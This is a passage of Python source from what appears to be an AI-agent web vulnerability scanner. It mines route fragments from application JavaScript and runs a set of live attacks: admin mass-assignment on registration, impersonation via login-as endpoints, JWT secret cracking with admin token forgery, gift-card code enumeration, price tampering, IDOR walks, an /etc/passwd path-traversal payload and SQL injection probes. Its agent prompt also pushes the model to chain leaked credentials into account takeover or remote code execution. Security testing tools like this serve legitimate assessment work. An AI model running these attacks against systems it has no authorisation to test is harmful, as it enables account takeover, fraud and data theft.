    for u in _extract_urls_any(cache):                    # .js the crawl/js-endpoints already saw
        if isinstance(u, str) and u.endswith(".js") and u not in srcs:
            srcs.append(u)
    return srcs


def _paths_near_keyword(cache: dict, base_url: str, host: str, base: str, keyword: str) -> list:
    """OBSERVATION-driven discovery: the path(s) a bundle actually uses NEAR a keyword (e.g. the endpoint the
    SPA posts a `refresh` token to). Beats a hardcoded path guess - we hit the endpoint the app really uses,
    wherever the developer put it (`/auth`, `/session`, anything)."""
    scheme = urlparse(base_url).scheme or "https"
    out, seen = [], set()
    for key, raw in cache.items():
        if not key or key[0] not in ("http-request", "js-endpoints", "katana-crawl") or not raw:
            continue
        for m in re.finditer(keyword, raw, re.I):
            win = raw[max(0, m.start() - 90):m.end() + 90]
            for pm in re.finditer(r'["\'`](/[A-Za-z][A-Za-z0-9_./-]{1,50})["\'`]', win):
                frag = pm.group(1)
                for full in (f"{scheme}://{host}{base}{frag}", f"{scheme}://{host}{frag}"):
                    if full not in seen:
                        seen.add(full)
                        out.append(full)
    return out


def _mine_rest_routes(cache: dict, base_url: str, headers: list, debug: bool) -> tuple:
    """Return (endpoints, base, api_host): full URLs built from bundle route-fragments + detected API base,
    hosted on the app's API host - which may be a DIFFERENT (cross-origin) host than the UI (ui on test.com,
    API on api.whatever.com). Falls back to the UI host when the API is same-origin."""
    scheme = urlparse(base_url).scheme or "https"
    ui_host = (urlparse(base_url).hostname or "").lower()
    backends = _app_backend_origins(cache, base_url)
    host = (urlparse(backends[0]).hostname or "").lower() if backends else ui_host   # cross-origin API host
    if host != ui_host:
        debug_print(f"bob :: cross-origin API detected: UI={ui_host} API={host}")
    frags, prefixed = set(), set()
    for src in _script_srcs(cache, base_url)[:6]:
        raw = _call(["http-request", src], headers, debug)
        try:
            body = str((((json.loads(raw).get("data") or [{}]) or [{}])[0] or {}).get("content") or "")
        except Exception:  # noqa: BLE001
            continue
        for m in _REST_FRAG_RE.finditer(body):
            f = m.group(1)
            low = f.lower()
            if any(n in low for n in _REST_NOUN):
                (prefixed if low.startswith(("/api", "/v1", "/v2", "/rest")) else frags).add(f)
    # detect the API base: an already-prefixed fragment or a discovered /api url tells us the prefix
    base = ""
    for u in list(prefixed) + [str(x) for x in _extract_urls_any(cache)]:
        m = re.match(r"^(?:https?://[^/]+)?(/(?:api|v1|v2|rest)[a-z0-9]*)/", u if u.startswith("http") else u)
        if m:
            base = m.group(1)
            break
    endpoints = set()
    for f in frags:
        endpoints.add(f"{scheme}://{host}{base}{f}")     # bare fragment + detected base
        endpoints.add(f"{scheme}://{host}{f}")           # and as-is (in case base is empty)
    for f in prefixed:
        endpoints.add(f"{scheme}://{host}{f}")
    for u in _extract_urls_any(cache):                    # already-discovered endpoints (either host)
        if isinstance(u, str):
            uu = u if u.startswith("http") else f"{scheme}://{host}{u if u.startswith('/') else '/' + u}"
            if (urlparse(uu).hostname or "").lower() in (host, ui_host):
                endpoints.add(uu.split("?")[0])
    return sorted(endpoints), base, host


def _rest_get(url: str, headers: list, debug: bool) -> tuple:
    raw = _call(["http-request", url], headers, debug)
    try:
        d = (json.loads(raw).get("data") or [{}])[0] or {}
        return int(d.get("status") or 0), str(d.get("content") or "")
    except Exception:  # noqa: BLE001
        return 0, ""


def _rest_post(url: str, body: dict, headers: list, debug: bool) -> tuple:
    argv = ["http-request", url, "-D", json.dumps(body), "-H", "Content-Type: application/json"]
    raw = _call(argv, headers, debug)
    try:
        d = (json.loads(raw).get("data") or [{}])[0] or {}
        return int(d.get("status") or 0), str(d.get("content") or "")
    except Exception:  # noqa: BLE001
        return 0, ""


def _rest_exploit_backstop(cache: dict, headers: list, base_url: str, debug: bool) -> list:
    """REST analog of the GraphQL exploiter: mine endpoints, then run the single-request plays that a
    spec-less scan misses - register mass-assignment (+ token harvest -> weak-secret), login-as
    impersonation, weak reset-token leak, sequential gift-card/code enum, and authed excessive-data/BOLA
    with a forged admin token. Silent unless REST endpoints with these nouns were discovered."""
    endpoints, base, host = _mine_rest_routes(cache, base_url, headers, debug)   # host = API host (may be cross-origin)
    if not endpoints:
        return []

    def _match(*nouns):
        out = []
        for u in endpoints:
            p = urlparse(u).path.lower()
            if any(("/" + n) in p or p.endswith(n) for n in nouns):
                out.append(u)
        return out

    findings, tokens = [], []
    cands = _jwt_secret_candidates(base_url, cache)

    def _harvest(body):
        for m in _JWT_RE.findall(body or ""):
            if m not in tokens:
                tokens.append(m)

    # tokens bob already captured (e.g. an accessToken leaked by a list endpoint)
    tokens.extend([t for t in _harvest_jwts(cache) if t not in tokens])

    # --- seed REAL ids from list endpoints first (ids are often UUIDs, so 1,2,3 won't resolve) ---
    seed_ids = []
    for u in _match("users", "orders", "recent")[:6]:
        if re.search(r"/(\{[^}]+\}|:\w+|\d+)/?$", u):     # skip detail templates when seeding
            continue
        st, body = _rest_get(u, headers, debug)
        _harvest(body)
        for m in re.findall(r'"id"\s*:\s*"?([0-9a-fA-F][0-9a-fA-F-]{2,39})"?', body):
            if m not in seed_ids:
                seed_ids.append(m)
    seed_ids = seed_ids[:5] or ["1", "2", "3"]

    # --- register mass-assignment (POST role=admin/credits) ---
    for u in _match("register", "signup")[:4]:
        st, body = _rest_post(u, {"username": "zzqreg" + _rand6(), "email": f"zzq{_rand6()}@example.com",
                                  "password": "Passw0rd!23", "role": "admin", "is_admin": True,
                                  "credits": 999999}, headers, debug)
        if st not in _ACCEPTED_STATUSES:
            continue
        _harvest(body)
        tok_admin = _token_says_admin(body)
        if tok_admin or re.search(r'"role"\s*:\s*"admin"', body, re.I):
            findings.append({"severity": "high", "title": "REST mass-assignment on register (client set role=admin/credits)",
                             "url": u, "evidence": "registration accepted role=admin; issued identity is admin"})

    # --- login-as / impersonation (POST, with a REAL seeded id) ---
    for u in _match("login-as", "loginas", "impersonate", "switch-user", "sudo")[:4]:
        for sid in seed_ids[:3]:
            st, body = _rest_post(u, {"userId": sid, "id": sid, "username": "admin"}, headers, debug)
            if st in _ACCEPTED_STATUSES and _JWT_RE.search(body):
                _harvest(body)
                findings.append({"severity": "high", "title": "REST impersonation via login-as (no admin check, mints a token)",
                                 "url": u, "evidence": "unauth POST returned an access token for another user"})
                break

    # --- weak / leaked reset (POST forgot -> token echoed) ---
    for u in _match("forgot", "password/reset", "reset-password", "recover")[:4]:
        st, body = _rest_post(u, {"username": "admin", "email": "admin@example.com"}, headers, debug)
        if re.search(r'"(token|reset_?token|code)"\s*:\s*"[^"]{6,}"', body, re.I) or \
           re.search(r'\breset[:=][A-Za-z0-9+/=_-]{6,}', body):
            findings.append({"severity": "high", "title": "REST weak/leaked reset token (returned in response body)",
                             "url": u, "evidence": "reset token echoed to caller (must be emailed only)"})

    # --- crack a harvested token -> forge admin identity for the authed passes ---
    admin_hdr = list(headers)
    for t in tokens[:8]:
        sec = _jwt_crack(t, cands)
        if sec:
            admin_hdr = list(headers) + [f"Authorization: Bearer {_jwt_forge_admin(t, sec)}"]
            findings.append({"severity": "high", "title": "Weak JWT signing secret - HS256 token forgeable (admin impersonation)",
                             "url": base_url, "evidence": f"a captured REST token verifies under a guessable secret [redacted len {len(sec)}]"})
            break
    else:
        if tokens:
            admin_hdr = list(headers) + [f"Authorization: Bearer {tokens[0]}"]

    # --- sequential gift-card / code enum (GET .../CODE) ---
    for u in _match("giftcard", "gift-card", "voucher", "coupon")[:4]:
        base_u = u.rstrip("/")
        # SEED a real code (so we don't rely on a hardcoded prefix): the list endpoint or a purchase POST
        # usually returns one; walk ITS numeric neighbours. Fall back to GC-/numeric hints if none found.
        real = []
        for probe in (base_u, base_u):
            st, body = _rest_get(base_u, admin_hdr, debug)
            real += _CODE_RE.findall(body)
            break
        if not real:
            st, body = _rest_post(base_u, {"amount": 10}, admin_hdr, debug)   # buy one
            real += _CODE_RE.findall(body)
        cands = [c for rc in dict.fromkeys(real) for c in _code_neighbors(rc)]
        cands += [fmt % n for n in range(1, 4) for fmt in ("GC-%05d", "GC-%06d", "%05d", "%d")]
        hits = 0
        for cand in list(dict.fromkeys(cands))[:24]:
            st, body = _rest_get(f"{base_u}/{cand}", admin_hdr, debug)
            if st == 200 and re.search(r'"(balance|amount|value)"\s*:', body):
                hits += 1
        if hits >= 2:
            findings.append({"severity": "high", "title": "Sequential gift-card/code enumeration",
                             "url": base_u, "evidence": f"{hits} codes resolved by walking a real code's neighbours"})

    # --- single-request BUSINESS LOGIC: POST-tamper mined state-changing endpoints with a money/qty/price
    # body (authenticated) and check the server trusts it - the same mechanical tamper the spec-driven
    # biz-logic backstop does on box/nom, here over ROUTE-MINED endpoints for a spec-less API ---
    sid = str(seed_ids[0])
    _biz_body = {"total": -1, "amount": 9999, "price": -1, "unitPrice": -1, "quantity": -1, "qty": -1,
                 "stock": -1, "discount": 110, "credits": -100, "balance": -100, "status": "paid", "role": "admin",
                 "toUserId": sid, "userId": sid, "targetUserId": sid, "toUser": sid}   # seed real ids for transfers
    scheme = urlparse(base_url).scheme or "https"
    # OBSERVATION-driven target discovery: any endpoint the app itself sends a MONEY/QTY/PRICE field to is a
    # business-logic candidate, WHATEVER it is named - mine the bundle for a `fetch/axios.post(<path>, {..})`
    # whose body object mentions total/amount/price/qty/discount/credits. This finds the state-changing ops on
    # an app whose endpoints aren't named checkout/refund. (The noun list below stays as a helper, not the sole
    # source.) Every candidate is still CONFIRMED BY BEHAVIOUR (tampered value accepted/echoed) downstream.
    money_re = re.compile(r'(total|amount|price|subtotal|cost|qty|quantity|discount|credits|balance|refund)', re.I)
    observed = set()
    for _key, _raw in cache.items():
        if not _key or _key[0] not in ("http-request", "js-endpoints", "katana-crawl") or not _raw:
            continue
        for pm in re.finditer(r'["\'`](/[A-Za-z][A-Za-z0-9_./:{}$-]{2,60})["\'`]\s*,\s*\{([^{}]{0,160})', _raw):
            if money_re.search(pm.group(2)):
                frag = re.sub(r"[:{$][^/]*", "1", pm.group(1)).split("?")[0]
                observed.add(f"{scheme}://{host}{base}{frag}")
                observed.add(f"{scheme}://{host}{frag}")
    # targets = OBSERVED money-posting endpoints + noun-matched (helper) + constructed nested action sub-resources
    targets = list(observed) + list(_match("checkout", "transfer", "refund", "credit", "seller", "item", "cart",
                          "order", "payment", "coupon", "voucher", "purchase", "buy", "subscribe", "promote", "upgrade"))
    for parent in ("orders", "payments", "order", "payment", "subscriptions"):
        for action in ("refund", "cancel", "capture", "reorder", "complete", "approve", "fulfill", "confirm"):
            if any(parent in urlparse(t).path.lower() for t in targets) and \
               any(action in urlparse(t).path.lower() or ("/" + action) in t.lower() for t in targets):
                # the sub-resource id may be numeric (orders often are) or a uuid - try a few
                for aid in ("1", "2", sid):
                    targets.append(f"{scheme}://{host}{base}/{parent}/{aid}/{action}")
    biz_seen, biz_reported = set(), set()
    for u in targets:
        base_u = re.sub(r"/(\{[^}]+\}|:\w+|\d+)/?$", "/" + sid, u).split("?")[0].rstrip("/")
        npath = urlparse(base_u).path.rstrip("/") or "/"
        rpath = re.sub(r"/(\d+|[0-9a-fA-F-]{8,})(?=/|$)", "/:id", npath)   # /orders/1/refund -> /orders/:id/refund
        if npath in biz_seen or rpath in biz_reported:
            continue
        biz_seen.add(npath)
        st, body = _rest_post(base_u, _biz_body, admin_hdr, debug)
        if st not in _ACCEPTED_STATUSES:
            continue
        echoed = [k for k in ("total", "amount", "price", "quantity", "qty", "discount", "credits", "status",
                              "role", "refunded", "captured")
                  if re.search(rf'"{k}"\s*:\s*"?(-?(?:1\b|100|110|9999|-100|paid|admin))', body, re.I)]
        leaks = bool(re.search(r'"(passwordHash|accessToken)"\s*:\s*"[^"]{3,}"', body))   # strong: response leaks creds
        if echoed:
            biz_reported.add(rpath)
            findings.append({"severity": "high", "title": f"REST business logic: {rpath} trusts client value(s)",
                             "url": base_u, "evidence": f"POST accepted & echoed tampered {','.join(echoed[:4])} (no server-side re-validation)"})
        elif leaks:                                       # a state-changing POST that leaks creds = BFLA/excessive-data
            biz_reported.add(rpath)
            findings.append({"severity": "high", "title": f"REST privilege action leaks credentials on {rpath}",
                             "url": base_u, "evidence": "state-changing POST returned passwordHash/accessToken"})
        if len(biz_seen) >= 20:
            break

    # --- authed excessive-data on list endpoints + BOLA on detail endpoints (reuse seeded real ids) ---
    for u in _match("users", "orders", "recent")[:6]:
        if re.search(r"/(\{[^}]+\}|:\w+|\d+)/?$", u):
            continue
        st, body = _rest_get(u, admin_hdr, debug)
        if re.search(r'"(passwordHash|accessToken)"\s*:\s*"[^"]{3,}"', body):
            findings.append({"severity": "high", "title": "REST excessive data: list endpoint leaks password hashes / tokens",
                             "url": u.split("?")[0], "evidence": "response includes passwordHash / accessToken for users"})
    # --- hidden-admin: an UNAUTH endpoint whose noun implies an admin/internal listing that returns an
    # array of user-shaped records is a hidden admin surface even without pwHash (referenced only in SPA JS) ---
    for u in endpoints:
        pl = urlparse(u).path.lower()
        if not any(n in pl for n in ("recent", "/admin", "internal", "staff", "member", "moderator", "backoffice")):
            continue
        if re.search(r"/(\{[^}]+\}|:\w+|\d+)/?$", u):
            continue
        base_u = u.split("?")[0]
        st, body = _rest_get(base_u, headers, debug)      # UNAUTH (no forged token)
        if st == 200 and (body.count('"username"') + body.count('"email"') + body.count('"role"')) >= 2 \
                and re.search(r'"id"\s*:\s*"?[0-9a-fA-F-]{2,}', body):
            findings.append({"severity": "high",
                             "title": f"Hidden admin surface: {urlparse(u).path} dumps a user list unauthenticated",
                             "url": base_u, "evidence": "unauth GET returns an array of user records (id/username/role)"})
    walk = seed_ids[:3]
    for u in _match("users", "orders"):
        if not re.search(r"/(\{[^}]+\}|:\w+|\d+)$", u):   # only detail-shaped endpoints
            base_detail = u.rstrip("/")
            det = [base_detail + "/" + str(i) for i in walk]
        else:
            det = [re.sub(r"/(\{[^}]+\}|:\w+|\d+)$", "/" + str(i), u) for i in walk]
        sens, distinct = False, set()
        for du in det:
            st, body = _rest_get(du, admin_hdr, debug)
            if st == 200 and re.search(r'"(passwordHash|accessToken|password)"\s*:\s*"[^"]{3,}"', body):
                sens = True
            if st == 200 and '"id"' in body:
                distinct.add(hashlib_key(body)[:120])
        npath = urlparse(u).path.rstrip("/") or "/"       # normalise so /x and /x/ dedup to one finding
        if sens:
            findings.append({"severity": "high", "title": f"REST BOLA + excessive data on {npath} (any user's creds)",
                             "url": u.rstrip("/"), "evidence": "walking ids returns other principals' passwordHash/accessToken"})
        elif len(distinct) >= 2 and any(n in npath.lower() for n in ("order", "user", "invoice", "account", "payment")):
            findings.append({"severity": "high", "title": f"REST BOLA/IDOR on {npath} (other users' objects)",
                             "url": u.rstrip("/"), "evidence": f"{len(distinct)} distinct owned objects across walked ids"})

    # --- param-GUESS: a spec-less API hides its `?file=`/`?q=`, so for an endpoint whose NOUN implies a
    # file-read or a search, guess the well-known param names for that TYPE and inject (traversal / SQLi).
    _file_noun = ("help", "doc", "download", "file", "export", "attachment", "report", "invoice", "manual",
                  "media", "view", "read", "template", "render", "preview")
    _search_noun = ("search", "query", "lookup", "find", "filter", "item", "items", "review", "reviews",
                    "product", "products", "list", "autocomplete", "suggest")
    _file_params = ("file", "path", "name", "doc", "template", "page")
    _query_params = ("q", "query", "search", "term", "keyword", "s")
    tv_seen, sq_seen, verbose_flagged = set(), set(), False
    for u in endpoints:
        base_u = u.split("?")[0]
        pl = urlparse(base_u).path.lower()
        if any(("/" + n) in pl or pl.endswith(n) for n in _file_noun) and base_u not in tv_seen:
            tv_seen.add(base_u)
            for pm in _file_params:
                st, body = _rest_get(f"{base_u}?{pm}=../../../../etc/passwd", admin_hdr, debug)
                if "root:x:0:0" in body:
                    findings.append({"severity": "high", "title": f"REST path traversal on {urlparse(u).path} ({pm}=)",
                                     "url": base_u, "evidence": f"?{pm}=../etc/passwd returned /etc/passwd"})
                    break
        if any(("/" + n) in pl or pl.endswith(n) for n in _search_noun) and base_u not in sq_seen:
            sq_seen.add(base_u)
            # probe the endpoint itself AND its /search/<noun> wrapper (a universal REST search convention:
            # /api/items -> /api/search/items) - the query column is usually the injectable one
            variants = [base_u, re.sub(r"/([^/]+)$", r"/search/\1", base_u)]
            hit = False
            for cand in variants:
                for pm in _query_params:
                    st, body = _rest_get(f"{cand}?{pm}='", admin_hdr, debug)
                    if re.search(r"sql syntax|unrecognized token|sqlite|syntax error|near \"|mysql|psql", body, re.I):
                        findings.append({"severity": "high", "title": f"REST SQL injection on {urlparse(cand).path} ({pm}=)",
                                         "url": cand, "evidence": f"?{pm}=' -> DB error"})
                        if not verbose_flagged and re.search(r"stack|at [\w./]+\(|/node_modules/", body, re.I):
                            findings.append({"severity": "medium", "title": "REST verbose errors (DB stack trace in response)",
                                             "url": cand, "evidence": "injection error returns a stack trace"})
                            verbose_flagged = True
                        hit = True
                        break
                if hit:
                    break

    # --- user enumeration: a login that answers differently for a real vs a fake account leaks who exists ---
    real_user = "admin"
    for u in _match("users", "recent")[:3]:
        st, body = _rest_get(u.split("?")[0], admin_hdr, debug)
        m = re.search(r'"username"\s*:\s*"([A-Za-z0-9_.@-]{2,30})"', body)
        if m:
            real_user = m.group(1)
            break
    fake_user = "zzq" + "".join(random.choices(string.ascii_lowercase, k=10))
    for u in _match("login", "signin", "auth/login")[:3]:
        if any(x in urlparse(u).path.lower() for x in ("login-as", "loginas")):
            continue
        _, b_real = _rest_post(u.split("?")[0], {"username": real_user, "email": real_user, "password": "zzWrongPw!1"}, headers, debug)
        _, b_fake = _rest_post(u.split("?")[0], {"username": fake_user, "email": fake_user + "@x.com", "password": "zzWrongPw!1"}, headers, debug)
        if b_real and _enum_body_key(b_real) != _enum_body_key(b_fake):
            findings.append({"severity": "medium", "title": f"REST user enumeration via {urlparse(u).path}",
                             "url": u.split("?")[0], "evidence": "login response differs for a real vs a random username"})
            break

    # --- token refresh: exchange a refresh token for a fresh access token (know HOW to refresh, to keep a live
    # token on a long scan) and detect refresh-NO-ROTATION single-run (same refresh token works twice) ---
    def _is_refresh(t):
        try:
            return json.loads(_b64url_decode(t.split(".")[1])).get("type") == "refresh"
        except Exception:  # noqa: BLE001
            return False
    rtoks = [t for t in tokens if _is_refresh(t)] or tokens[:1]
    if rtoks:
        rt = rtoks[0]
        # DISCOVER the refresh endpoint by OBSERVATION, not a hardcoded path: (1) the path the bundle uses near
        # 'refresh', plus (2) discovered auth/session/token endpoints as candidates - but CONFIRM only by
        # BEHAVIOUR: an endpoint is the refresh iff POSTing the refresh token returns a NEW access token.
        sch = urlparse(base_url).scheme or "https"
        # OBSERVED first (the path the bundle uses near 'refresh' + discovered auth endpoints), then common
        # conventions as a LAST-RESORT helper - but every candidate is CONFIRMED BY BEHAVIOUR below, so the
        # finding never rests on a guessed path, only on "this endpoint actually minted a new access token".
        cand = _paths_near_keyword(cache, base_url, host, base, "refresh") + \
            [e for e in endpoints if any(n in urlparse(e).path.lower()
                                         for n in ("refresh", "auth", "session", "token", "login", "renew"))] + \
            [f"{sch}://{host}{base}/{p}" for p in ("refresh", "auth/refresh", "token/refresh", "session/refresh")]
        seen_r = set()
        for up in [c.split("?")[0].rstrip("/") for c in cand][:14]:
            if up in seen_r:
                continue
            seen_r.add(up)
            body = {"refreshToken": rt, "refresh_token": rt, "token": rt, "grant_type": "refresh_token"}
            _, b1 = _rest_post(up, body, headers, debug)
            if not any(m != rt for m in _JWT_RE.findall(b1 or "")):    # OBSERVED: did a NEW access token come back?
                continue                                              # no -> not the refresh endpoint, keep looking
            _, b2 = _rest_post(up, body, headers, debug)              # reuse the SAME refresh token
            if any(m != rt for m in _JWT_RE.findall(b2 or "")):
                findings.append({"severity": "medium", "title": f"REST refresh token not rotated (replayable) on {urlparse(up).path}",
                                 "url": up, "evidence": "observed: the same refresh token mints a NEW access token twice - no rotation/revocation"})
            break                                                     # confirmed the refresh endpoint by behaviour

    # dedup by (title, path) to avoid N near-identical rows
    seen, out = set(), []
    for f in findings:
        k = (f["title"], _norm_url_key(f["url"]))
        if k not in seen:
            seen.add(k)
            out.append(f)
    return out


def _rand6() -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=6))


def _token_says_admin(body: str) -> bool:
    for m in _JWT_RE.findall(body or ""):
        try:
            pl = json.loads(_b64url_decode(m.split(".")[1]))
            if str(pl.get("role", "")).lower() == "admin" or pl.get("is_admin") or pl.get("admin"):
                return True
        except Exception:  # noqa: BLE001
            pass
    return False


def hashlib_key(s: str) -> str:
    """Coarse fingerprint of a response body - strip whitespace + long ints so IDs don't make two 'same' bodies
    look different."""
    return _NORM_STRIP_INT.sub("N", " ".join(s.split()))[:400]


def _collapse_repeated_findings(findings: list) -> list:
    """iter14: some backstops (CORS-with-credentials in particular) find the SAME global misconfig on N endpoints
    and would emit N near-identical rows. Fold any group of findings that share (severity, title) into ONE row
    whose evidence lists the affected paths and whose url points at the first-found path."""
    if not findings:
        return findings
    groups: dict = {}
    for f in findings:
        key = (str(f.get("severity", "")).lower(), str(f.get("title", "")).strip())
        groups.setdefault(key, []).append(f)
    out = []
    for (sev, title), items in groups.items():
        if len(items) == 1:
            out.append(items[0])
            continue
        paths = []
        for it in items:
            try:
                p = urlparse(str(it.get("url", ""))).path or ""
            except Exception:  # noqa: BLE001
                p = str(it.get("url", ""))
            if p and p not in paths:
                paths.append(p)
        preview = ", ".join(paths[:6]) + (f" (+{len(paths) - 6} more)" if len(paths) > 6 else "")
        out.append({
            "severity": sev,
            "title": f"{title} — global misconfig ({len(paths)} paths)",
            "url": items[0].get("url", ""),
            "evidence": f"affected paths: {preview}",
        })
    return out


def _merge_findings(agent_findings: list, backstop_findings: list) -> list:
    """Merge without duplicates: dedup by (severity+lowercased-title+normalized-url). Agent's findings take
    precedence; backstop only adds ones the agent missed."""
    if not backstop_findings:
        return agent_findings
    seen = set()
    for f in agent_findings:
        k = (str(f.get("severity", "")).lower(),
             str(f.get("title", "")).lower().strip(),
             _norm_url_key(str(f.get("url", ""))))
        seen.add(k)
    merged = list(agent_findings)
    for f in backstop_findings:
        k = (str(f.get("severity", "")).lower(),
             str(f.get("title", "")).lower().strip(),
             _norm_url_key(str(f.get("url", ""))))
        if k in seen:
            continue
        seen.add(k)
        merged.append(f)
    return merged


def add_arguments(parser) -> None:
    parser.add_argument("target", help="Target URL / host (the app root)")
    add_agent_args(parser, max_steps=500)


def run(args) -> int:
    target = args.target.strip()
    if not target:
        output_result([], args.output, "a target is required")
        return 2
    base_url = target if target.startswith(("http://", "https://")) else "https://" + target
    host = (urlparse(base_url).hostname or "").lower()
    _COOKIE_JAR.clear()                                   # fresh cookie jar per scan (WAF clearance/session)

    provider_cls = PROVIDERS[args.provider]          # bob is an LLM agent - a provider/key is MANDATORY
    key = args.api_key or os.environ.get(provider_cls.env)
    if not key:
        sys.stderr.write(f"bob: an LLM is required - provide --api-key or set {provider_cls.env} "
                         f"for --provider {args.provider}\n")
        return 2
    provider = provider_cls(args.model or provider_cls.default_model, key, base_url=args.base_url)

    headers = list(args.header or [])                # sent on every tool call (auth for a login-walled app)
    if args.context.strip():
        cfg = briefing.parse(provider, args.context, host)
        headers += cfg.get("headers", []) or []
        if cfg.get("headers"):
            sys.stderr.write("bob :: auth header(s) parsed from --context (values hidden)\n")

    tools_spec = toolschema.native_tools(_TOOLS)
    debug_print(f"bob :: fingerprinting the catch-all for {base_url} ...")
    fingerprint = _catch_all_fingerprint(base_url, headers, args.debug)
    user = (f"TARGET: {base_url}\nSCOPE: {host} AND any API/backend host THIS app itself calls (a SPA often "
            f"serves its UI on one host and its API on another - e.g. an `api.`/`backend.` subdomain or a "
            f"sibling domain hardcoded as the API base in the JS bundle; that backend is in scope). Do NOT "
            f"touch unrelated third-party hosts (CDNs, analytics, payment, fonts).\n\n{fingerprint}\n\n"
            "Run your short surface scan now - drive the tools, verify before you flag, and finish with the "
            "report. Begin.")
    messages = [{"role": "user", "content": user}]

    cache: dict = {}
    count: dict = {}
    final_text = ""
    nudged = False
    chain_nudged = False

    for step in range(max(1, args.max_steps)):
        try:
            resp = provider.send(_SYSTEM, messages, tools_spec)
        except Exception as exc:  # noqa: BLE001
            sys.stderr.write(f"bob: provider error: {exc}\n")
            break
        text, calls = provider.parse(resp)
        messages += provider.assistant_msg(resp)
        if text.strip():
            final_text = text
            debug_print("bob> " + (" ".join(text.split()) if args.debug else " ".join(text.split())[:220]))
        if not calls:
            if final_text.strip() and any(m in final_text for m in ("```json", '"application"', '"findings"')):
                if not chain_nudged:                 # before accepting the report, force one chain-building pass
                    chain_nudged = True
                    messages.append({"role": "user", "content": (
                        "Before you finalize: review the FULL INVENTORY of what this scan gathered - every "
                        "credential, token, session cookie, API key, user-id/email, leaked secret or signing key, "
                        "config value, injectable point, uploaded/served file, and reachable admin/panel/console. "
                        "For EACH, ask whether it COMBINES with anything else you found into a chain you have not "
                        "finished: a recovered credential you never reused on a login/panel, a token you did not "
                        "replay on every gated endpoint, a leaked id you did not walk, a secret you did not forge "
                        "with, a console you did not test with a benign RCE marker, or a two-/three-hop path (e.g. "
                        "leak -> forge -> victim email -> password-reset -> account takeover). Chains are not always "
                        "the obvious straight line - compose the primitives you hold. If ANY chain is still open, "
                        "pursue it NOW with the tools; only re-emit the final JSON once every chain has dead-ended "
                        "or reached admin access / another user's data / RCE.")})
                    continue
                break                                # the agent delivered the structured output
            if not nudged:                           # a chatty turn without acting - push it once
                nudged = True
                messages.append({"role": "user", "content": "Use the tools to actually scan - start with "
                                 "http-request on the base and go from there. Do not answer without acting."})
                continue
            break
        results = []
        for c in calls:
            if c["name"] not in _TOOLS:
                results.append({"id": c["id"], "output": json.dumps({"error": f"{c['name']} is not a bob tool"})})
                continue
            argv = toolschema.to_argv(c["name"], c["args"])
            keyt = tuple(argv)
            count[keyt] = count.get(keyt, 0) + 1
            if count[keyt] > 2:
                out = json.dumps({"success": False, "error": "already ran this exact call - reuse the result"})
            elif keyt in cache:
                out = cache[keyt]
            else:
                debug_print("bob> boxcutter " + " ".join(str(a) for a in argv))
                out = _call(argv, headers, args.debug)
                cache[keyt] = out
            results.append({"id": c["id"], "output": _cap(out)})
        messages += provider.tool_results(results)

    data, findings = _parse_output(final_text)       # structured output; bob renders the report from it
    for f in findings:                               # normalise severity casing for the envelope's sort/dedup
        f["severity"] = str(f.get("severity", "info")).lower()

    # iter7: DETERMINISTIC FUZZ BACKSTOP - findings churn on repeat runs (each iteration finds SOME injections
    # but drops others), because the LLM re-plans budget every run. A deterministic pass over EVERY discovered
    # {FUZZ}-marked variant that the agent didn't already cover locks in the injection breadth.
    backstop = _fuzz_backstop(cache, headers, base_url, args.debug)
    findings = _merge_findings(findings, backstop)

    # iter9: BUSINESS-LOGIC + MASS-ASSIGNMENT + USER-ENUM BACKSTOP - the LLM knows the plays but rarely fires them;
    # a deterministic sweep of POST endpoints with a body-tamper payload catches these single-request findings.
    # iter12: acquire a token first (from /api/auth-test-style debug endpoint) so auth-gated apps' POSTs land.
    auth_headers = list(headers) + _acquire_debug_token(cache, base_url, args.debug)
    biz = _biz_logic_backstop(cache, auth_headers, base_url, args.debug)
    findings = _merge_findings(findings, biz)
    enum_findings = _user_enum_backstop(cache, headers, base_url, args.debug)
    findings = _merge_findings(findings, enum_findings)
    # iter12: open-redirect + header-mutation deterministic backstops
    redir = _open_redirect_backstop(cache, headers, base_url, args.debug)
    findings = _merge_findings(findings, redir)
    hdr = _header_mutation_backstop(cache, headers, base_url, args.debug)
    hdr = _collapse_repeated_findings(hdr)              # iter14: fold N×"CORS with credentials on X" into one
    findings = _merge_findings(findings, hdr)
    # iter16: BOLA walk - with the acquired token, walk id-bearing endpoints 1..3 and see whose data comes back
    bola = _bola_walk_backstop(cache, auth_headers, base_url, args.debug)
    findings = _merge_findings(findings, bola)
    # iter17: alg:none admin forge - the known missing chain
    aln = _alg_none_backstop(cache, headers, base_url, args.debug)
    findings = _merge_findings(findings, aln)
    # iter18: weak reset-token probe
    reset = _weak_reset_backstop(cache, headers, base_url, args.debug)
    findings = _merge_findings(findings, reset)
    # iter19: webhook backstop dropped per user (VM-agnostic focus; webhooks were also target-specific bodies)
    # iter23: weak JWT-secret crack -> forge (the master key on any HS256 app whose secret is guessable /
    # derived from its own name; harvests tokens bob already captured, so it costs nothing extra)
    jwtw = _jwt_weak_secret_backstop(cache, headers, base_url, args.debug)
    findings = _merge_findings(findings, jwtw)
    # iter24: deterministic GraphQL exploitation (introspection-guided excessive-data / BOLA / traversal /
    # arg-SQLi / mutation-execution / weak-secret) - the whole attack surface of a GraphQL-first app
    gqlx = _graphql_exploit_backstop(cache, headers, base_url, args.debug)
    findings = _merge_findings(findings, gqlx)
    # iter25: REST exploitation over mined route-fragments (register mass-assign, login-as, weak-reset,
    # gift-card enum, authed excessive-data/BOLA) - the depth a spec-less SPA API otherwise hides
    restx = _rest_exploit_backstop(cache, headers, base_url, args.debug)
    findings = _merge_findings(findings, restx)
    # iter26: LATERAL MOVEMENT (creds -> login -> deeper access -> RCE) is deliberately AGENTIC, not a
    # backstop: credentials leak from too many different places (SQLi dumps, .env/config/backup, debug
    # endpoints, JS, git, heapdumps, stack traces) and the login/console steps need real-time reasoning, so
    # the MODEL drives it with sqlmap (to dump tables) + http-request (to reuse creds and hit the console),
    # guided by the CREDENTIAL REUSE / CODE-CONSOLE plays in _SYSTEM. No deterministic chain backstop here.

    # DETERMINISTIC summary (notification-ready) + FIXED-structure report (identical layout every run)
    notif, summary_md, summary = _summarize(host, findings)
    report = _render_report(base_url, data, findings, summary_md)

    debug_print(f"\nbob :: {notif}  ({step + 1} steps)\n")
    debug_print(report + "\n")

    if getattr(args, "report", None):
        try:
            with open(args.report, "w", encoding="utf-8") as fh:
                fh.write(report + "\n")
            debug_print(f"bob :: report written to {args.report}")
        except OSError as exc:
            sys.stderr.write(f"bob: could not write report to {args.report}: {exc}\n")

